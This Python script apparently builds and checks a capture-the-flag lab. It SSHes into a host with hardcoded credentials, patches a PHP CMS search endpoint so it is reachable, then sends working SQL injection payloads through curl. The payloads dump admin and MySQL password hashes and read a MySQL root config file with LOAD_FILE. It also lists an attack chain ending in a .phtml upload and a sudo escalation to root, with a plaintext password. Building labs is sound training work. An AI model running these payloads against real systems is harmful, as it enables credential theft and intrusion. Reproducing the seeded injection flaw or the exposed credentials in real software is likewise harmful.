#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Final fix: add index() method to API SearchController, test SQLi"""
import paramiko
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:150]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

# ============================================================
# 1. Read SearchController and add index() method
# ============================================================
print("="*60)
print("1. ADD index() METHOD TO SearchController")
print("="*60)

# Read current file
t1 = paramiko.Transport(('192.168.100.1', 22))
t1.connect(username=user, password=pwd)
sftp = paramiko.SFTPClient.from_transport(t1)

with sftp.open('/var/www/cms/apps/api/controller/SearchController.php', 'r') as f:
    content = f.read().decode('utf-8')

print(f"Current file: {len(content)} bytes")

# Add index() method that calls suggest()
# Find the suggest() method and add index() before it
old_method = '    // 实时搜索建议 (AJAX)\n    public function suggest()'
new_method = """    // 默认入口 — 调用搜索建议
    public function index()
    {
        $this->suggest();
    }

    // 实时搜索建议 (AJAX)
    public function suggest()"""

if 'function index()' not in content:
    content = content.replace(old_method, new_method, 1)
    print("Added index() method")
else:
    print("index() already exists")

# Write to /tmp first (gdadmin has write perms), then sudo cp
with sftp.open('/tmp/SearchController_tmp.php', 'w') as f:
    f.write(content.encode('utf-8'))

print(f"New file: {len(content)} bytes")

sftp.close()
t1.close()

# sudo cp to destination
c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

run(c1, "echo 'Gdadmin@123' | sudo -S cp /tmp/SearchController_tmp.php /var/www/cms/apps/api/controller/SearchController.php")
run(c1, "echo 'Gdadmin@123' | sudo -S chown www-data:www-data /var/www/cms/apps/api/controller/SearchController.php")

run(c1, "head -30 /var/www/cms/apps/api/controller/SearchController.php")

# ============================================================
# 2. Also clear cache and restart
# ============================================================
print("\n" + "="*60)
print("2. CLEAR CACHE & RESTART")
print("="*60)
run(c1, "echo 'Gdadmin@123' | sudo -S rm -f /var/www/cms/runtime/config/* 2>&1")
run(c1, "echo 'Gdadmin@123' | sudo -S rm -f /var/www/cms/runtime/cache/* 2>&1")
run(c1, "echo 'Gdadmin@123' | sudo -S systemctl restart apache2 2>&1; echo OK")

# ============================================================
# 3. Test SQLi!
# ============================================================
print("\n" + "="*60)
print("3. TEST SQLi")
print("="*60)

# Normal search
run(c1, "curl -s 'http://localhost/api.php/search?keyword=test' 2>&1")

# SQLi probe (single quote)
run(c1, "curl -s 'http://localhost/api.php/search?keyword=test%27' 2>&1")

# UNION injection to extract admin password
# URL encoded: ' UNION SELECT 1,username,password,4 FROM ay_user--
payload = "test%27%20UNION%20SELECT%201%2Cusername%2Cpassword%2C4%20FROM%20ay_user--%20"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Extract specific values
# ' UNION SELECT 1,host,plugin,4 FROM mysql.user--
payload2 = "test%27%20UNION%20SELECT%201%2Cuser%2Cpassword%2C4%20FROM%20mysql.user--%20"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword=test%27%20UNION%20SELECT%201%2C%40%40version%2C3%2C4--%20' 2>&1")

# Try reading /etc/mysql/mysql.conf.d/root.cnf via LOAD_FILE (for A-4 chain)
payload3 = "test%27%20UNION%20SELECT%201%2CLOAD_FILE%28%27%2Fetc%2Fmysql%2Fmysql.conf.d%2Froot.cnf%27%29%2C3%2C4--%20"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload3}' 2>&1")

# ============================================================
# 4. Quick CTF chain verification
# ============================================================
print("\n" + "="*60)
print("4. CTF CHAIN SUMMARY")
print("="*60)
print("A-1: curl http://A1/backup/ → autoindex lists sql.gz")
print("A-2: curl 'http://A1/api.php/search?keyword=test' UNION SELECT 1,username,password,4 FROM ay_user-- ")
print("A-3: curl http://A1/config/database.php → source code leak")
print("A-4: Via A-2 SQLi: UNION SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/root.cnf')")
print("A-5: UEditor upload .phtml → check if UEditor exists")
print("A-6: sudo find → root@A1 (operator:0p3rat0r@GDJ)")

# Check UEditor existence
run(c1, "ls /var/www/cms/apps/admin/view/default/ueditor/ 2>/dev/null | head -5 || echo 'NO_UEDITOR'")
run(c1, "find /var/www/cms -name 'ueditor' -type d 2>/dev/null")

c1.close()
print("\nDone!")
